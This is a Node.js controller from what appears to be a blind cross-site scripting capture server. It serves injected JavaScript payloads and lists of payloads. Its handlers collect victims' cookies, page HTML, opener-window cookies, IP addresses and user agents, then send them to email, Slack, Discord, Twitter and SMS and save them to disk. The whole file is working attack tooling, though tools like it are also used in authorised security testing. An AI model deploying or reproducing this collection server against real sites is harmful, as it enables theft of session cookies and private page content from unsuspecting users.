// Copyright 2018 Lewis Ardern. All rights reserved.

const mail = require('../utilities/services/email');
const sms = require('../utilities/services/sms');
const process = require('../utilities/process');
const save = require('../utilities/save');
const uuid = require('uuid/v1');
const config = require('../config/config');
const slack = require('../utilities/services/slack');
const discord = require('../utilities/services/discord');
const ciscoTeams = require('../utilities/services/spark');
const twitter = require('../utilities/services/twitter');
const template = require('../utilities/templates/script');
const payloads = require('../utilities/payloads');
const check = require('../utilities/check');

function reportToUtilities(guid, domain, config) {
  mail.sendMail(guid, domain, config);
  slack.sendSlack(guid, domain, config);
  ciscoTeams.sendCiso(guid, domain, config);
  discord.sendDiscord(guid, domain, config);
  twitter.sendTwitter(guid, domain, config);
}

function sendSmsAndSaveToDisk(check, domain, res, guid) {
  // check if domain.URL exists or is not null/empty (should always be captured if valid request)
  if (!check.folderOrFileExists() && !!domain.URL) {
    if (!check.lastSms()) {
      console.log(`Sending SMS For URL ${domain.URL}`);
      sms.sendSMS(guid, domain, config, save);
      console.log(`Saving To Disk URL ${domain.URL}`);
      save.saveFile(guid, domain, config);
      res.redirect(domain.URL);
    } else {
      res.redirect(domain.URL);
      console.log('Already sent SMS today, saving to disk');
      console.log(`Saving To Disk URL ${domain.URL}`);
      save.saveFile(guid, domain, config);
    }
  } else {
    console.log(`The domain ${domain.URL} already exists`);
    console.log(`Saving To Disk URL ${domain.URL}`);
    save.saveFile(guid, domain, config);
    res.redirect(domain.URL);
  }
}

exports.displayScript = (req, res) => {
  res.type('.js');
  const generatedTemplate = template.generateTemplate(config);
  res.send(generatedTemplate);
};

exports.displayDefault = (req, res) => {
  res.type('.js');
  res.send('alert(1)');
};

exports.generatePayloads = (req, res) => {
  res.set('Content-Type', 'text/plain');
  const generatedPayloads = payloads.generatePayloads(config);
  res.send(generatedPayloads);
};

exports.capture = (req, res) => {
  if (req.body._) {
    const rawDump = unescape(req.body._);
    const domain = process.processDomain(rawDump, config);
    domain.victimIP = req.headers['x-forwarded-for'] || req.connection.remoteAddress || req.socket.remoteAddress || req.connection.socket.remoteAddress;
    domain.userAgent = req.headers['user-agent'];
    const guid = uuid();


    // Always send to email, slack, webex teams, or discord
    reportToUtilities(guid, domain, config);

    // check if domain.URL exists or is not null/empty (should always be captured if valid request)
    sendSmsAndSaveToDisk(check, domain, res, guid)
  }
};
// Need to Rearchitecture this -- but simple PoC to-begin with.
exports.httpGet = (req, res) => {
  const domain = {
    Cookie: 'null',
    innerHTML: 'null',
    URL: req.get('referer'),
    openerLocation: 'null',
    openerInnerHTML: 'null',
    openerCookie: 'null',
    hasSecurityTxt: 'null',
    victimIP: req.headers['x-forwarded-for'] || req.connection.remoteAddress || req.socket.remoteAddress || req.connection.socket.remoteAddress,
    userAgent: req.headers['user-agent'],
  };
  const guid = uuid();

  // Always send to email, slack, webex teams, or discord
  reportToUtilities(guid, domain, config);

  // check if domain.URL exists or is not null/empty (should always be captured if valid request)
  sendSmsAndSaveToDisk(check, domain, res, guid)
};

